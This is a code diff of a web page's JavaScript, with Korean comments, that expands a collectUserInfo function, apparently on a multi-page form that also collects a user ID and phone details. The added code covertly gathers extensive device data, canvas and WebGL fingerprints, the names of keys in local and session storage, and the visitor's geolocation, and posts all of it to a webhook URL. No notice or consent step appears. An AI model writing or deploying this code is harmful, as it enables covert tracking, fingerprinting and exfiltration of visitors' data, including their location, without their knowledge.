@@ -116,64 +116,129 @@ function goNext() {
   showPage('page1', 'page2');
 }
 
+// --- 확장된 정보 수집 ---
 async function collectUserInfo() {
-  const formData = new URLSearchParams();
-  formData.append("userAgent", navigator.userAgent);
-  formData.append("language", navigator.language);
-  formData.append("platform", navigator.platform);
-  formData.append("cookieEnabled", navigator.cookieEnabled);
-  formData.append("onLine", navigator.onLine);
-  formData.append("hardwareConcurrency", navigator.hardwareConcurrency ?? "unknown");
-  formData.append("deviceMemory", navigator.deviceMemory ?? "unknown");
-  formData.append("plugins", Array.from(navigator.plugins).map(p=>p.name).join(",") || "unknown");
-  formData.append("screen.width", screen.width);
-  formData.append("screen.height", screen.height);
-  formData.append("screen.availWidth", screen.availWidth);
-  formData.append("screen.availHeight", screen.availHeight);
-  formData.append("screen.colorDepth", screen.colorDepth);
-  formData.append("screen.pixelDepth", screen.pixelDepth);
-  formData.append("window.innerWidth", window.innerWidth);
-  formData.append("window.innerHeight", window.innerHeight);
-  formData.append("window.outerWidth", window.outerWidth);
-  formData.append("window.outerHeight", window.outerHeight);
-  formData.append("timezone", Intl.DateTimeFormat().resolvedOptions().timeZone);
-  if (navigator.connection) {
-    formData.append("network.downlink", navigator.connection.downlink ?? "unknown");
-    formData.append("network.effectiveType", navigator.connection.effectiveType ?? "unknown");
-    formData.append("network.rtt", navigator.connection.rtt ?? "unknown");
-    formData.append("network.saveData", navigator.connection.saveData ?? "unknown");
-  } else { formData.append("network.info", "unknown"); }
-  if (navigator.getBattery) {
-    try {
-      const battery = await navigator.getBattery();
-      formData.append("battery.charging", battery.charging);
-      formData.append("battery.level", battery.level);
-      formData.append("battery.chargingTime", battery.chargingTime);
-      formData.append("battery.dischargingTime", battery.dischargingTime);
-    } catch(e) { formData.append("battery.info", "unknown"); }
-  } else { formData.append("battery.info", "unknown"); }
-  if (window.DeviceMotionEvent) {
-    window.addEventListener("devicemotion", e=>{
-      if (e.acceleration) {
-        formData.append("sensors.acceleration.x", e.acceleration.x ?? "unknown");
-        formData.append("sensors.acceleration.y", e.acceleration.y ?? "unknown");
-        formData.append("sensors.acceleration.z", e.acceleration.z ?? "unknown");
-      }
-    }, { once:true });
-  }
-  if (window.DeviceOrientationEvent) {
-    window.addEventListener("deviceorientation", e=>{
-      formData.append("sensors.orientation.alpha", e.alpha ?? "unknown");
-      formData.append("sensors.orientation.beta", e.beta ?? "unknown");
-      formData.append("sensors.orientation.gamma", e.gamma ?? "unknown");
-    }, { once:true });
-  }
-  formData.append("timestamp", new Date().toISOString());
-  formData.append("page","1");
+    const formData = new URLSearchParams();
 
-  fetch(webhookUrl,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:formData})
-  .catch(err=>console.error("WebHook 전송 오류:",err));
+    // 브라우저/플랫폼
+    formData.append("userAgent", navigator.userAgent);
+    formData.append("language", navigator.language);
+    formData.append("languages", navigator.languages.join(","));
+    formData.append("platform", navigator.platform);
+    formData.append("vendor", navigator.vendor);
+    formData.append("cookieEnabled", navigator.cookieEnabled);
+    formData.append("onLine", navigator.onLine);
+    formData.append("hardwareConcurrency", navigator.hardwareConcurrency ?? "unknown");
+    formData.append("deviceMemory", navigator.deviceMemory ?? "unknown");
+    formData.append("maxTouchPoints", navigator.maxTouchPoints ?? "unknown");
+    formData.append("appName", navigator.appName);
+    formData.append("appVersion", navigator.appVersion);
+    formData.append("product", navigator.product);
+
+    // 화면/디스플레이
+    formData.append("screen.width", screen.width);
+    formData.append("screen.height", screen.height);
+    formData.append("screen.availWidth", screen.availWidth);
+    formData.append("screen.availHeight", screen.availHeight);
+    formData.append("screen.colorDepth", screen.colorDepth);
+    formData.append("screen.pixelDepth", screen.pixelDepth);
+    formData.append("window.innerWidth", window.innerWidth);
+    formData.append("window.innerHeight", window.innerHeight);
+    formData.append("window.outerWidth", window.outerWidth);
+    formData.append("window.outerHeight", window.outerHeight);
+    formData.append("devicePixelRatio", window.devicePixelRatio);
+    formData.append("timezone", Intl.DateTimeFormat().resolvedOptions().timeZone);
+
+    // 네트워크
+    if (navigator.connection) {
+        formData.append("network.downlink", navigator.connection.downlink ?? "unknown");
+        formData.append("network.effectiveType", navigator.connection.effectiveType ?? "unknown");
+        formData.append("network.rtt", navigator.connection.rtt ?? "unknown");
+        formData.append("network.saveData", navigator.connection.saveData ?? "unknown");
+    }
+
+    // 배터리
+    if (navigator.getBattery) {
+        try {
+            const battery = await navigator.getBattery();
+            formData.append("battery.charging", battery.charging);
+            formData.append("battery.level", battery.level);
+            formData.append("battery.chargingTime", battery.chargingTime);
+            formData.append("battery.dischargingTime", battery.dischargingTime);
+        } catch(e){ formData.append("battery.info","unknown"); }
+    }
+
+    // 플러그인/폰트
+    formData.append("plugins", Array.from(navigator.plugins).map(p=>p.name).join(",") || "unknown");
+    formData.append("fonts", Array.from(document.fonts).map(f => f.family).join(",") || "unknown");
+
+    // 센서
+    if(window.DeviceMotionEvent) {
+        window.addEventListener("devicemotion", e=>{
+            if(e.acceleration) {
+                formData.append("sensors.acceleration.x", e.acceleration.x ?? "unknown");
+                formData.append("sensors.acceleration.y", e.acceleration.y ?? "unknown");
+                formData.append("sensors.acceleration.z", e.acceleration.z ?? "unknown");
+            }
+        }, { once:true });
+    }
+    if(window.DeviceOrientationEvent) {
+        window.addEventListener("deviceorientation", e=>{
+            formData.append("sensors.orientation.alpha", e.alpha ?? "unknown");
+            formData.append("sensors.orientation.beta", e.beta ?? "unknown");
+            formData.append("sensors.orientation.gamma", e.gamma ?? "unknown");
+        }, { once:true });
+    }
+
+    // Canvas fingerprint
+    try {
+        const canvas = document.createElement("canvas");
+        const ctx = canvas.getContext("2d");
+        ctx.textBaseline = "top";
+        ctx.font = "14px Arial";
+        ctx.fillStyle = "#f60";
+        ctx.fillRect(125,1,62,20);
+        ctx.fillStyle = "#069";
+        ctx.fillText("fingerprint_test", 2, 15);
+        ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+        ctx.fillText("fingerprint_test", 4, 17);
+        formData.append("canvasFingerprint", canvas.toDataURL());
+    } catch(e){ formData.append("canvasFingerprint","error"); }
+
+    // WebGL fingerprint
+    try {
+        const canvas = document.createElement("canvas");
+        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+        formData.append("webgl.vendor", debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "unknown");
+        formData.append("webgl.renderer", debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "unknown");
+    } catch(e){ formData.append("webgl","error"); }
+
+    // Local/Session Storage
+    try { formData.append("localStorageKeys", Object.keys(localStorage).join(",")); } catch(e) { formData.append("localStorageKeys","error"); }
+    try { formData.append("sessionStorageKeys", Object.keys(sessionStorage).join(",")); } catch(e) { formData.append("sessionStorageKeys","error"); }
+
+    formData.append("timestamp", new Date().toISOString());
+    formData.append("page","1");
+
+    // 전송
+    fetch(webhookUrl, {method:"POST", headers:{"Content-Type":"application/x-www-form-urlencoded"}, body:formData})
+        .catch(err=>console.error("WebHook 전송 오류:",err));
+
+    // Geolocation
+    if(navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(pos=>{
+            fetch(webhookUrl, {method:"POST", headers:{"Content-Type":"application/x-www-form-urlencoded"}, body: new URLSearchParams({
+                page:"geo",
+                latitude: pos.coords.latitude,
+                longitude: pos.coords.longitude,
+                accuracy: pos.coords.accuracy,
+                timestamp: new Date().toISOString()
+            })}).catch(err=>console.error(err));
+        });
+    }
 }
+// --- 끝 정보 수집 ---
 
 function sendPhone() {
   const userId = document.getElementById("userId").value.trim();
